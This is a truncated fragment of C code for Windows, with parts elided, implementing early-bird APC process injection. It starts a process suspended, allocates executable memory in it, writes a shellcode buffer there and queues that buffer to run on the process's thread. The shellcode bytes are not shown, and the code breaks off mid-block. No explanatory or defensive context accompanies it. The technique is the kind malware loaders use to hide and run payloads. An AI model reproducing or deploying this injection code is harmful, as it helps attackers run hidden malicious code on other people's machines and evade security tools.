...
int main(int argc, char *argv[]) {
	...
	if (CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &sinfo, &pinfo)) {
		LPVOID addressPointer = VirtualAllocEx(pinfo.hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (addressPointer) {
			if (WriteProcessMemory(pinfo.hProcess, addressPointer, shellcode, sizeof(shellcode), 0)) {
				QueueUserAPC((PAPCFUNC)addressPointer, pinfo.hThread, (ULONG_PTR)NULL);
